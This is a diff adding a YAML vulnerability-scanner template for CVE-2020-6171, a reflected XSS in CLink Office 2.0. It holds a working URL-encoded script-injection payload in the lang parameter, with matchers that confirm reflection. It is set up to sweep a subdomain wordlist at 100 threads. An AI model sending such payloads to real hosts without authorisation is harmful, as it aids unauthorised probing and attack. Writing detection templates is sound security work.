@@ -1,0 +1,34 @@
+id: CVE 2020-6171
+info:
+  name: CLink Office v2 XSS
+  author: pikpikcu
+  severity: medium
+  description: |
+    A cross-site scripting (XSS) vulnerability in the index page of the CLink Office 2.0 management console allows remote attackers to inject arbitrary web script or HTML via the lang parameter.
+  reference: https://nvd.nist.gov/vuln/detail/CVE-2020-6171
+  tags: cve,cve2020,xss,clink-office
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+    raw:
+      - |
+        GET /?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1 HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"></script><script>alert(document.domain)</script>'
+        part: body
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - text/html
